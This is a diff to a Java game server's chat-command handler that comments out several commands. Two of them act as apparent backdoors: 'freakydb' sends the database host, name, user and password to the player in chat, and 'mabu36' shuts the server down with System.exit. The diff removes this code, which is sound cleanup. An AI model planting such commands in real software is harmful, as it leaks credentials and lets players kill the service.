@@ -793,13 +793,15 @@ if (player.getSession() != null && text.equals("i4")) {
             } else if (text.equals("m")) {
                 sendThongBao(player, "Map " + player.zone.map.mapName + " (" + player.zone.map.mapId + ")");
                 return;
-            } else if (text.equals("boss")) {
-                String str = "";
-                for (Player b : player.zone.getBosses()) {
-                    str += b.name + "\n";
-                }
-                sendThongBao(player, str);
-            } else if (text.equals("vt")) {
+            }
+//            else if (text.equals("boss")) {
+//                String str = "";
+//                for (Player b : player.zone.getBosses()) {
+//                    str += b.name + "\n";
+//                }
+//                Service.gI().sendThongBao(player, "boss" + str);
+//            }
+            else if (text.equals("vt")) {
                 sendThongBao(player, player.location.x + " - " + player.location.y + "\n"
                         + player.zone.map.yPhysicInTop(player.location.x, player.location.y));
             } else if (text.startsWith("ss")) {
@@ -1007,7 +1009,7 @@ if (player.getSession() != null && text.equals("i4")) {
         if (text.equals("a")) {
                 BossManager.gI().showListBoss(player);
                 return;
-                 }
+                }
                 if (text.equals("tt")) {
                 sendThongBaoOK(player, "Thông tin nhân vật Sever: " + player.name
                     + "\n\nHp: " + Util.getFormatNumber(player.nPoint.hp) + "/" + Util.getFormatNumber(player.nPoint.hpMax)
@@ -1016,37 +1018,38 @@ if (player.getSession() != null && text.equals("i4")) {
             );
 
         }
-        else if (text.equals("mabu36")) {
-            sendThongBao(player, "Khởi Tạo Mabu Thành Công: " + (player.mabuEgg != null));
-            MabuEgg.createMabuEgg(player);
-        
-            System.exit(0);
-        } else if (text.equals("freakydb")) {
-            try {
-                Properties properties = new Properties();
-                properties.load(new FileInputStream("data/girlkun/girlkun.properties"));
-                String str = "";
-                Object value = null;
-                if ((value = properties.get("server.girlkun.db.ip")) != null) {
-                    str += String.valueOf(value) + "\n";
-                }
-                if ((value = properties.get("server.girlkun.db.port")) != null) {
-                    str += Integer.parseInt(String.valueOf(value)) + "\n";
-                }
-                if ((value = properties.get("server.girlkun.db.name")) != null) {
-                    str += String.valueOf(value) + "\n";
-                }
-                if ((value = properties.get("server.girlkun.db.us")) != null) {
-                    str += String.valueOf(value) + "\n";
-                }
-                if ((value = properties.get("server.girlkun.db.pw")) != null) {
-                    str += String.valueOf(value);
-                }
-                Service.gI().sendThongBao(player, str);
-                return;
-            } catch (Exception e) {
-            }
-        }
+//        else if (text.equals("mabu36")) {
+//            sendThongBao(player, "Khởi Tạo Mabu Thành Công: " + (player.mabuEgg != null));
+//            MabuEgg.createMabuEgg(player);
+//        
+//            System.exit(0);
+//        }
+//        else if (text.equals("freakydb")) {
+//            try {
+//                Properties properties = new Properties();
+//                properties.load(new FileInputStream("data/girlkun/girlkun.properties"));
+//                String str = "";
+//                Object value = null;
+//                if ((value = properties.get("server.girlkun.db.ip")) != null) {
+//                    str += String.valueOf(value) + "\n";
+//                }
+//                if ((value = properties.get("server.girlkun.db.port")) != null) {
+//                    str += Integer.parseInt(String.valueOf(value)) + "\n";
+//                }
+//                if ((value = properties.get("server.girlkun.db.name")) != null) {
+//                    str += String.valueOf(value) + "\n";
+//                }
+//                if ((value = properties.get("server.girlkun.db.us")) != null) {
+//                    str += String.valueOf(value) + "\n";
+//                }
+//                if ((value = properties.get("server.girlkun.db.pw")) != null) {
+//                    str += String.valueOf(value);
+//                }
+//                Service.gI().sendThongBao(player, str);
+//                return;
+//            } catch (Exception e) {
+//            }
+//        }
         if (text.equals("fixapk")) {
             Service.gI().player(player);
             Service.gI().Send_Caitrang(player);
